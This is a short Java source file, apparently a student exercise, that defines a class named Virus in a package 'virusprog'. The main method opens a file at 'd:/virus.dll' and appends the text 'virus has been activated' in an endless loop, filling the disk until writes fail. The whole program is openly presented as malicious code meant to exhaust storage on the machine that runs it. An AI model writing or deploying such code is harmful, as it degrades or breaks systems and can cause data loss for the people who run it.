/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package virusprog;
import java.io.FileWriter;
import java.io.IOException;
/**
 *
 * @author Dhyanesh
 */
public class Virus {
     public static void main(String args[])
{
 try
{
FileWriter fw=new FileWriter("d:/virus.dll",true);
while(true)
{
fw.write("virus has been activated");
}
}
catch(IOException e)
{
e.printStackTrace();
}
}   

}
